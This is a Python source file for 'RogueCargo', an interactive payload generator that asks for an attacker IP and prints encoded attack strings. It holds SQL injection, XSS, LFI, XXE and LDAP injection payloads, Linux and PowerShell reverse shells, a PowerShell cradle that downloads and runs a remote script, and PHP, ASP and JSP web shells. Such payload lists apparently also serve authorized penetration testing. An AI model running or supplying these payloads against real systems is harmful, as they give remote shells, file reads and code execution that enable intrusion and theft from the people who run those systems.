import argparse
import os
import json
import base64
import urllib.parse

def ask_question(question, options):
    print(f"\n{question}")
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")
    
    choice = input("Select an option (number): ")
    while not choice.isdigit() or int(choice) not in range(1, len(options) + 1):
        choice = input("Invalid choice. Please select a valid option: ")
    
    return options[int(choice) - 1]

def encode_payload(payload):
    print("\n[+] Select encoding method:")
    encoding_method = ask_question("Choose an encoding technique:", ["None", "Base64", "URL Encoding", "Hex"])
    
    if encoding_method == "Base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding_method == "URL Encoding":
        return urllib.parse.quote(payload)
    elif encoding_method == "Hex":
        return payload.encode().hex()
    return payload

def suggest_payloads(payload_type, service, os_type, attacker_ip):
    payloads = {
        "SQL Injection": {
            "MySQL": [
                "' OR '1'='1' --", 
                "admin' --", 
                "1' UNION SELECT null, username, password FROM users --",
                "1 AND SLEEP(5) --", 
                "1' AND 1=CAST((SELECT @@version) AS INT) --"
            ]
        },
        "XSS": {
            "JavaScript": [
                "<script>alert('XSS')</script>",
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(document.domain)>"
            ]
        },
        "LFI": {
            "Apache": [
                "../../../../etc/passwd", 
                "../../../../var/log/apache2/access.log", 
                "/proc/self/environ"
            ]
        },
        "XXE": {
            "XML": [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/malicious.dtd\">]><foo>&xxe;</foo>"
            ]
        },
        "SSRF": {
            "Web": [
                f"http://{attacker_ip}:8080/admin",
                f"file:///etc/passwd"
            ]
        },
        "LDAP Injection": {
            "Active Directory": [
                "*)(|(cn=*))", 
                "*)(|(uid=*))(|(uid=admin))"
            ]
        },
        "Shell": {
            "Linux": [
                f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
                f"nc -e /bin/bash {attacker_ip} 4444"
            ],
            "Windows": [
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
                f"cmd.exe /c powershell -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{attacker_ip}/shell.ps1')\""
            ]
        },
        "Web Shells": {
            "PHP": [
                "<?php system($_GET['cmd']); ?>",
                "<?php echo shell_exec($_GET['cmd']); ?>",
                "<?php passthru($_GET['cmd']); ?>",
                "<?php eval($_POST['cmd']); ?>"
            ],
            "ASP": [
                "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"true\"%> <script runat=\"server\"> void Page_Load(object sender, EventArgs e) { System.Diagnostics.Process.Start(Request[\"cmd\"]); } </script>"
            ],
            "JSP": [
                "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
            ]
        }
    }
    
    print(f"\n[+] Suggested Payloads for {payload_type} on {service} (OS: {os_type}):")
    for payload in payloads.get(payload_type, {}).get(service, ["No payloads available"]):
        encoded_payload = encode_payload(payload)
        print(f"  - {encoded_payload}")

def main():
    print("\n🔥 Welcome to RogueCargo - Your Payload Generator 🔥")
    
    attacker_ip = input("Enter your attacker IP (for reverse shells, etc.): ")
    
    payload_type = ask_question("What type of payload do you need?", ["SQL Injection", "XSS", "LFI", "XXE", "SSRF", "LDAP Injection", "Shell", "Web Shells"])
    
    service_mapping = {
        "SQL Injection": ["MySQL"],
        "XSS": ["JavaScript"],
        "LFI": ["Apache"],
        "XXE": ["XML"],
        "SSRF": ["Web"],
        "LDAP Injection": ["Active Directory"],
        "Shell": ["Linux", "Windows"],
        "Web Shells": ["PHP", "ASP", "JSP"]
    }
    
    service = ask_question(f"Which service or technology are you targeting?", service_mapping[payload_type])
    
    os_type = ask_question("What is the target operating system?", ["Linux", "Windows", "Unknown"])
    
    suggest_payloads(payload_type, service, os_type, attacker_ip)

if __name__ == "__main__":
    main()
